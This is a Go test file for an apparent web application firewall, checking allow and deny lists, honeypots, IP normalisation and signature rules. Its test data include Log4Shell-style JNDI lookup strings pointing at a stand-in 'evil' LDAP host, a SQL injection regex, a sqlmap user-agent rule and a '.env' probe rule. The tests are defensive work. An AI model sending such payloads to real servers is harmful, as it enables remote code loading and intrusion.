// Angie Guardian — WAF + proof-of-work bot firewall for Angie.
// Copyright (C) 2026 Melroy van den Berg
// SPDX-License-Identifier: AGPL-3.0-or-later

package stateless

import (
	"net/netip"
	"strings"
	"testing"
)

const guestYAML = `
defaults:
  denylist:
    ips: [ "203.0.113.0/24" ]
domains:
  site.test:
    allowlist:
      ips: [ "10.0.0.0/8" ]
      uas: [ "Googlebot" ]
      paths: [ "/robots.txt", "/.well-known/" ]
    denylist:
      ips: [ "198.51.100.66" ]
      uas: [ "badbot" ]
      paths: [ "/blocked/" ]
    honeypot:
      enabled: true
      paths: [ "/wp-login.php", "/admin-old/" ]
    rules:
      - id: dotfile
        action: block
        keywords: [ "/.env" ]
      - id: sqli
        action: challenge
        regexes: [ 'union.+select' ]
      - id: scanner
        action: deny
        targets: [ ua ]
        keywords: [ "sqlmap" ]
`

func mustGuestConfig(t *testing.T, yaml string) *GuestConfig {
	t.Helper()
	gc, err := ParseGuestConfig([]byte(yaml))
	if err != nil {
		t.Fatal(err)
	}
	return gc
}

func req(host, ip, uri, ua string) *RequestContext {
	return &RequestContext{Host: host, Method: "GET", URI: uri, RemoteAddr: ip, UserAgent: ua}
}

func TestEvaluateViaGuestConfig(t *testing.T) {
	gc := mustGuestConfig(t, guestYAML)

	cases := []struct {
		name   string
		req    *RequestContext
		action Action
		reason string
	}{
		{"default allow", req("site.test", "192.0.2.7", "/page", "Mozilla"), ActionAllow, "default"},
		{"allowlist ip", req("site.test", "10.1.2.3", "/page", "curl"), ActionAllow, "allowlist:ip"},
		{"allowlist ua", req("site.test", "192.0.2.7", "/page", "compatible Googlebot/2.1"), ActionAllow, "allowlist:ua"},
		{"allowlist path prefix", req("site.test", "203.0.113.9", "/.well-known/acme/x", "curl"), ActionAllow, "allowlist:path"},
		{"denylist ip", req("site.test", "198.51.100.66", "/page", "curl"), ActionDeny, "denylist:ip"},
		{"allowlist beats denylist", req("site.test", "10.9.9.9", "/page", "curl"), ActionAllow, "allowlist:ip"},
		{"honeypot", req("site.test", "192.0.2.8", "/wp-login.php", "Mozilla"), ActionDeny, "honeypot:path"},
		{"honeypot url-encoded", req("site.test", "192.0.2.8", "/%77p-login.php", "Mozilla"), ActionDeny, "honeypot:path"},
		{"honeypot url-encoded prefix", req("site.test", "192.0.2.8", "/%61dmin-old/secret", "Mozilla"), ActionDeny, "honeypot:path"},
		{"signature keyword (block->deny)", req("site.test", "192.0.2.9", "/app/.env", "curl"), ActionDeny, "waf:dotfile"},
		{"signature url-encoded", req("site.test", "192.0.2.9", "/%2e%65nv", "curl"), ActionDeny, "waf:dotfile"},
		{"signature challenge degrades to deny", req("site.test", "192.0.2.9", "/x?q=union+all+select+1", "curl"), ActionDeny, "waf:sqli"},
		{"signature ua", req("site.test", "192.0.2.9", "/", "sqlmap/1.7"), ActionDeny, "waf:scanner"},
		{"defaults denylist", req("other.test", "203.0.113.5", "/", "curl"), ActionDeny, "denylist:ip"},
		{"defaults allow", req("other.test", "192.0.2.1", "/", "curl"), ActionAllow, "default"},
		{"host case + port normalized", req("SITE.test:443", "198.51.100.66", "/page", "curl"), ActionDeny, "denylist:ip"},
		{"honeypot dot-segment", req("site.test", "192.0.2.8", "/x/../wp-login.php", "Mozilla"), ActionDeny, "honeypot:path"},
		{"allowlist path no dot-segment escape", req("site.test", "198.51.100.66", "/.well-known/../secret", "curl"), ActionDeny, "denylist:ip"},
		{"denylist ua", req("site.test", "192.0.2.7", "/page", "BadBot/1.0"), ActionDeny, "denylist:ua"},
		{"denylist path prefix", req("site.test", "192.0.2.7", "/blocked/thing", "Mozilla"), ActionDeny, "denylist:path"},
		{"denylist path dot-segment", req("site.test", "192.0.2.7", "/x/../blocked/thing", "Mozilla"), ActionDeny, "denylist:path"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := gc.Evaluate(tc.req)
			if d.Action != tc.action || d.Reason != tc.reason {
				t.Errorf("got %s/%s, want %s/%s", d.Action, d.Reason, tc.action, tc.reason)
			}
		})
	}
}

func TestSignatureHeaderAndMethodRules(t *testing.T) {
	gc := mustGuestConfig(t, `
domains:
  h.test:
    rules:
      - id: jndi-header
        targets: [ "header:referer" ]
        keywords: [ "${jndi:" ]
      - id: no-trace
        methods: [ TRACE ]
`)
	if !gc.NeedsMethod() {
		t.Fatal("NeedsMethod() = false, want true (a rule filters by method)")
	}

	hdrs := map[string]string{"referer": "http://evil/%24%7Bjndi%3Aldap://x%7D"}
	r := req("h.test", "192.0.2.9", "/page", "Mozilla")
	r.Header = func(name string) []string {
		if v, ok := hdrs[name]; ok {
			return []string{v}
		}
		return nil
	}
	if d := gc.Evaluate(r); d.Action != ActionDeny || d.Reason != "waf:jndi-header" {
		t.Errorf("encoded jndi referer: got %s/%s, want deny/waf:jndi-header", d.Action, d.Reason)
	}

	// Every occurrence is inspected; a benign first value must not hide a
	// malicious duplicate supplied later in the request.
	r.Header = func(string) []string {
		return []string{"https://example.com/", "${jndi:ldap://evil/a}"}
	}
	if d := gc.Evaluate(r); d.Action != ActionDeny || d.Reason != "waf:jndi-header" {
		t.Errorf("malicious duplicate header: got %s/%s, want deny/waf:jndi-header", d.Action, d.Reason)
	}

	// Same request without the header getter: header targets never match.
	if d := gc.Evaluate(req("h.test", "192.0.2.9", "/page", "Mozilla")); d.Action != ActionAllow {
		t.Errorf("nil Header getter: got %s/%s, want allow", d.Action, d.Reason)
	}

	tr := req("h.test", "192.0.2.9", "/page", "Mozilla")
	tr.Method = "TRACE"
	if d := gc.Evaluate(tr); d.Action != ActionDeny || d.Reason != "waf:no-trace" {
		t.Errorf("TRACE: got %s/%s, want deny/waf:no-trace", d.Action, d.Reason)
	}

	// Rules without method filters never consult Method at all.
	plain := mustGuestConfig(t, `domains: { p.test: { rules: [ { id: kw, keywords: [ x ] } ] } }`)
	if plain.NeedsMethod() {
		t.Error("NeedsMethod() = true for a rule set without method filters")
	}
}

func TestGuestConfigRejectsTrailingYAMLDocument(t *testing.T) {
	if _, err := ParseGuestConfig([]byte("defaults: {}\n---\ndefaults: {}\n")); err == nil {
		t.Fatal("second YAML document must be rejected")
	}
}

func TestEvaluatePrecedence(t *testing.T) {
	// allowlist -> denylist -> honeypot -> signatures; first terminal wins.
	gc := mustGuestConfig(t, `
domains:
  x.test:
    allowlist:
      paths: [ "/robots.txt" ]
    denylist:
      ips: [ "203.0.113.5" ]
    honeypot:
      enabled: true
      paths: [ "/robots.txt" ]
`)
	if d := gc.Evaluate(req("x.test", "203.0.113.5", "/robots.txt", "curl")); d.Reason != "allowlist:path" {
		t.Fatalf("allowlist must win over denylist+honeypot, got %s/%s", d.Action, d.Reason)
	}
}

func TestParseGuestConfigErrors(t *testing.T) {
	for name, yaml := range map[string]string{
		"bad cidr":       `domains: { a: { denylist: { ips: [ "10.0.0.0/99" ] } } }`,
		"bad rule regex": "domains: { a: { rules: [ { id: r, regexes: [ '([' ] } ] } }",
		"unknown field":  `domains: { a: { nope: true } }`,
		"duplicate host": `domains: { a.test: { }, "A.test:443": { } }`,
	} {
		if _, err := ParseGuestConfig([]byte(yaml)); err == nil {
			t.Errorf("%s: expected error, got nil", name)
		}
	}
	// Compile errors must name the offending entry, not just the list.
	_, err := ParseGuestConfig([]byte(`domains: { a: { denylist: { ips: [ "10.0.0.0/99" ] } } }`))
	if err == nil || !strings.Contains(err.Error(), `invalid CIDR "10.0.0.0/99"`) {
		t.Errorf("compile error should quote the bad entry, got: %v", err)
	}
	// The duplicate-host error must name both raw keys, whichever map order
	// they are visited in, so the operator can find the second entry.
	_, err = ParseGuestConfig([]byte(`domains: { a.test: { }, "A.test:443": { } }`))
	if err == nil || !strings.Contains(err.Error(), `"a.test"`) || !strings.Contains(err.Error(), `"A.test:443"`) {
		t.Errorf("duplicate-host error should name both raw keys, got: %v", err)
	}
}

func TestParseGuestConfigAcceptsJSON(t *testing.T) {
	json := `{"domains":{"a.test":{"denylist":{"ips":["203.0.113.0/24"]}}}}`
	gc, err := ParseGuestConfig([]byte(json))
	if err != nil {
		t.Fatal(err)
	}
	if d := gc.Evaluate(req("a.test", "203.0.113.9", "/", "curl")); d.Action != ActionDeny {
		t.Fatalf("JSON config denylist not applied: %s/%s", d.Action, d.Reason)
	}
}

// TestKnownDomainInheritsDefaults locks in that a known domain inherits every
// field of `defaults` it does not itself override, matching the sidecar's
// per-domain-over-defaults merge (core.Config.finalize). Without the merge the
// WASM guest would silently apply weaker protection than the same YAML gives
// the sidecar.
func TestKnownDomainInheritsDefaults(t *testing.T) {
	gc := mustGuestConfig(t, `
defaults:
  denylist:
    ips: [ "203.0.113.0/24" ]
  honeypot:
    enabled: true
    paths: [ "/trap" ]
  rules:
    - id: default-dotfile
      action: deny
      keywords: [ "/.env" ]
domains:
  site.test:
    allowlist:
      paths: [ "/ok" ]
`)
	cases := []struct {
		name   string
		req    *RequestContext
		action Action
		reason string
	}{
		{"inherited denylist applies", req("site.test", "203.0.113.9", "/page", "curl"), ActionDeny, "denylist:ip"},
		{"inherited honeypot applies", req("site.test", "198.51.100.1", "/trap", "curl"), ActionDeny, "honeypot:path"},
		{"inherited rules apply", req("site.test", "198.51.100.1", "/app/.env", "curl"), ActionDeny, "waf:default-dotfile"},
		{"own allowlist still works", req("site.test", "198.51.100.1", "/ok", "curl"), ActionAllow, "allowlist:path"},
		{"clean request allowed", req("site.test", "198.51.100.1", "/page", "curl"), ActionAllow, "default"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			d := gc.Evaluate(tc.req)
			if d.Action != tc.action || d.Reason != tc.reason {
				t.Errorf("got %s/%s, want %s/%s", d.Action, d.Reason, tc.action, tc.reason)
			}
		})
	}
}

// TestDomainOverridesDefault confirms a domain that sets its own value for a
// field replaces (does not append to) the default for that field, while other
// default fields still apply.
func TestDomainOverridesDefault(t *testing.T) {
	gc := mustGuestConfig(t, `
defaults:
  denylist:
    ips: [ "203.0.113.0/24" ]
  honeypot:
    enabled: true
    paths: [ "/trap" ]
domains:
  site.test:
    denylist:
      ips: [ "198.51.100.66" ]
`)
	// The domain's own denylist replaces the default one.
	if d := gc.Evaluate(req("site.test", "198.51.100.66", "/", "curl")); d.Action != ActionDeny {
		t.Errorf("own denylist entry should apply, got %s/%s", d.Action, d.Reason)
	}
	// Replacement, not merge: the default denylist range no longer applies to
	// this domain because it set its own denylist (matches the sidecar, where a
	// domain field wholly overrides the default field).
	if d := gc.Evaluate(req("site.test", "203.0.113.9", "/", "curl")); d.Action != ActionAllow {
		t.Errorf("overridden denylist must replace the default range, got %s/%s", d.Action, d.Reason)
	}
	// The default honeypot (not overridden) still applies.
	if d := gc.Evaluate(req("site.test", "192.0.2.1", "/trap", "curl")); d.Reason != "honeypot:path" {
		t.Errorf("inherited honeypot should still apply, got %s/%s", d.Action, d.Reason)
	}
}

// TestNoRulesStaysDisabled locks in that a config without any rules block
// resolves every domain with keyword matching off, like the fallback. The
// defaults round-trip serializes a zero Rules node as "rules: null", which
// parses back as a non-zero !!null scalar; without the null guard in resolve()
// every configured domain would spuriously enable signatures on an empty set.
func TestNoRulesStaysDisabled(t *testing.T) {
	gc := mustGuestConfig(t, `
defaults:
  denylist:
    ips: [ "203.0.113.0/24" ]
domains:
  a.test: {}
`)
	dr := gc.resolved[NormalizeHost("a.test")]
	if dr == nil {
		t.Fatal("a.test not resolved")
	}
	if dr.KeywordsEnabled || dr.Rules != nil {
		t.Errorf("no rules configured: got KeywordsEnabled=%v Rules=%v, want false/nil", dr.KeywordsEnabled, dr.Rules)
	}
	if dr.KeywordsEnabled != gc.fallback.KeywordsEnabled {
		t.Errorf("resolved domain KeywordsEnabled=%v diverges from fallback=%v", dr.KeywordsEnabled, gc.fallback.KeywordsEnabled)
	}

	// An explicit empty list means the same as no rules.
	gc = mustGuestConfig(t, `domains: { c.test: { rules: [] } }`)
	if dr := gc.resolved["c.test"]; dr.KeywordsEnabled || dr.Rules != nil {
		t.Errorf("rules []: got KeywordsEnabled=%v Rules=%v, want false/nil", dr.KeywordsEnabled, dr.Rules)
	}

	// A domain can opt out of inherited default rules with an explicit null.
	gc = mustGuestConfig(t, `
defaults:
  rules:
    - id: r
      action: deny
      keywords: [ "/.env" ]
domains:
  optout.test:
    rules: null
  inherits.test: {}
`)
	if dr := gc.resolved["optout.test"]; dr.KeywordsEnabled || dr.Rules != nil {
		t.Errorf("rules null opt-out: got KeywordsEnabled=%v Rules=%v, want false/nil", dr.KeywordsEnabled, dr.Rules)
	}
	if dr := gc.resolved["inherits.test"]; !dr.KeywordsEnabled || dr.Rules == nil {
		t.Errorf("sibling should inherit default rules: got %+v", dr)
	}

	// Positive counterpart: a real rules block does enable keyword matching.
	gc = mustGuestConfig(t, `
domains:
  b.test:
    rules:
      - id: r
        action: deny
        keywords: [ "/.env" ]
`)
	dr = gc.resolved[NormalizeHost("b.test")]
	if dr == nil || !dr.KeywordsEnabled || dr.Rules == nil {
		t.Errorf("rules configured: got %+v, want KeywordsEnabled=true and non-nil Rules", dr)
	}
}

// TestClientIP locks in address normalization, including bare (unbracketed)
// IPv6 literals, which the old hand-rolled port-stripping mangled
// (2001:db8::1 -> 2001:db8:), silently disabling IP allow/deny for that client.
func TestClientIP(t *testing.T) {
	cases := map[string]string{
		"1.2.3.4:5678":      "1.2.3.4",        // IPv4 with port
		"1.2.3.4":           "1.2.3.4",        // IPv4 no port
		"[2001:db8::1]:443": "2001:db8::1",    // bracketed IPv6 with port
		"[2001:db8::1]":     "2001:db8::1",    // bracketed IPv6 no port
		"2001:db8::1":       "2001:db8::1",    // BARE IPv6, numeric tail (was mangled)
		"fe80::2":           "fe80::2",        // BARE IPv6, numeric tail (was mangled)
		"2001:db8::abcd":    "2001:db8::abcd", // BARE IPv6, hex tail
		"203.0.113.9":       "203.0.113.9",
		"":                  "",
		// Zone identifiers (link-local sources) survive both the bracketed
		// and bare forms; textual case is preserved (canonicalization is the
		// consumer's job, e.g. core.BlockKey).
		"[fe80::2%eth0]:443":  "fe80::2%eth0",
		"fe80::2%eth0":        "fe80::2%eth0",
		"[2001:DB8::A]:443":   "2001:DB8::A",
		"::ffff:198.51.100.7": "::ffff:198.51.100.7",
	}
	for in, want := range cases {
		if got := ClientIP(in); got != want {
			t.Errorf("ClientIP(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestUnparseableIPNoMatch(t *testing.T) {
	// The stateless denylist treats a garbage IP as "no match" (the guest has
	// no logger to error into); it must not panic or deny spuriously.
	gc := mustGuestConfig(t, `domains: { a: { denylist: { ips: [ "203.0.113.0/24" ] } } }`)
	if d := gc.Evaluate(req("a", "not-an-ip", "/", "curl")); d.Action != ActionAllow {
		t.Fatalf("garbage IP should fall through to allow, got %s/%s", d.Action, d.Reason)
	}
}

// TestListConfigIPv6 covers CIDR and bare-address matching for IPv6 ranges:
// v6 prefixes contain v6 addresses, an IPv4-mapped client address still hits
// a plain v4 prefix (MatchIP unmaps), a v6 address never bleeds into a v4
// range, and a zoned (link-local) address matches no prefix at all, which is
// netip.Prefix.Contains semantics this codebase relies on.
func TestListConfigIPv6(t *testing.T) {
	l := &ListConfig{IPs: []string{
		"2001:db8::/32",    // v6 CIDR
		"2001:db8:ffff::9", // bare v6 address
		"192.0.2.0/24",     // v4 CIDR
		"fe80::/10",        // link-local range
	}}
	if err := l.Compile(); err != nil {
		t.Fatal(err)
	}
	cases := map[string]bool{
		"2001:db8::1":         true,  // inside the v6 CIDR
		"2001:db8:ffff::9":    true,  // bare v6 entry, exact
		"2001:db8:ffff::a":    true,  // still inside 2001:db8::/32
		"2001:db9::1":         false, // adjacent v6 range
		"::ffff:192.0.2.7":    true,  // mapped v4 client hits the v4 CIDR
		"::ffff:198.51.100.7": false, // mapped v4 outside every range
		"192.0.2.7":           true,
		"fe80::1":             true,  // link-local, no zone
		"fe80::1%eth0":        false, // zoned addresses never match a prefix
	}
	for ip, want := range cases {
		if got := l.MatchIP(netip.MustParseAddr(ip)); got != want {
			t.Errorf("MatchIP(%s) = %v, want %v", ip, got, want)
		}
	}
}

// TestDenylistIPv6TextualForms drives the full stateless evaluate path with a
// v6 denylist: the client IP arrives as a string, so mixed-case and expanded
// textual forms must still land inside the range.
func TestDenylistIPv6TextualForms(t *testing.T) {
	gc := mustGuestConfig(t, `domains: { a: { denylist: { ips: [ "2001:db8:bad::/48" ] } } }`)
	for _, ip := range []string{
		"2001:db8:bad::1",
		"2001:0DB8:0BAD::1",
		"2001:0db8:0bad:0000:0000:0000:0000:0099",
	} {
		if d := gc.Evaluate(req("a", ip, "/", "curl")); d.Action != ActionDeny || d.Reason != "denylist:ip" {
			t.Errorf("%s: got %s/%s, want deny/denylist:ip", ip, d.Action, d.Reason)
		}
	}
	if d := gc.Evaluate(req("a", "2001:db8:cafe::1", "/", "curl")); d.Action != ActionAllow {
		t.Errorf("2001:db8:cafe::1 should not match 2001:db8:bad::/48, got %s/%s", d.Action, d.Reason)
	}
}
